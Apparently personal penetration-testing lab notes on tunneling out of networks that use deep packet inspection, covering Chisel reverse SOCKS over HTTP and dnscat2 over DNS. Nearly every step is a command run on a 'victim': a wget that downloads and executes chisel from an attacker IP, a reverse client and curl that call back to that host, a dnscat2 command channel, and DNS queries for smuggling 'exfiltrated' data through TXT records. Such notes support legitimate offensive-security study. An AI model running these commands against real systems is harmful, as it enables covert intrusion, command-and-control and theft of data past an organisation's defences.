# Reason use
1. Deep Packet Inspection (app layer 7) of Outbound is inplemented
2. Only some format/protocol of data can use e.g. HTTP, DNS
3. Use tunneling

# HTTP Tunneling
## Chisel 
1. choose correct version & architecture: https://github.com/jpillora/chisel/releases
2. transfer chisel to victim ``` bash -c 'wget "http://192.168.118.4/chisel" -O /tmp/chisel && chmod +x /tmp/chisel' ```
3. kali host: ``` chisel server --port 8080 --reverse ```
4. run chisel client in victim: ``` /tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 & ```
5. run with error output: ``` /tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/ ```
6. Debug with tcp packet anaylsis: ``` sudo tcpdump -nvvvXi tun0 tcp port 8080 ```
7. [OR] check status of socks (same as be4): ``` ss -ntplu ```
8. use ncat w/ Proxycommand to connect ``` ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215 ``` 

### Support local port / dynamic port fwing 
- local version like this (in victim) ``` /tmp/chisel client 192.168.45.225:8080 R:1080:10.4.225.215:8008  ```
- check this doc: https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/ 


# DNS Tunneling

## dnscat2
1. listen if success by traffic tcp ``` sudo tcpdump -i ens192 udp port 53 ```
2. dns server: ``` dnscat2-server feline.corp ```
3. victim: ``` ./dnscat feline.corp ```
4. open window for us to interact dns server & 1 = the window of connected (could be others so run ``` window ``` first) : ``` window -i 1 ```

## Logic behind
- NOT STEALTHY since so many packet 
- UDP 53
- reg a sussy DNS with a wanted domain name ```feline.corp ``` (this domain is important as if only original dns cant find then will redirect to you)
- check victim current Dns server: ``` resolvectl status ```
- run in rogue DNS server: ``` sudo dnsmasq -C dnsmasq.conf -d ``` 
- run in victim ``` nslookup exfiltrated-data.feline.corp ``` & check ``` sudo tcpdump -i ens192 udp port 53 ``` to see if tcp have query record
- Smuggling data thru TXT record
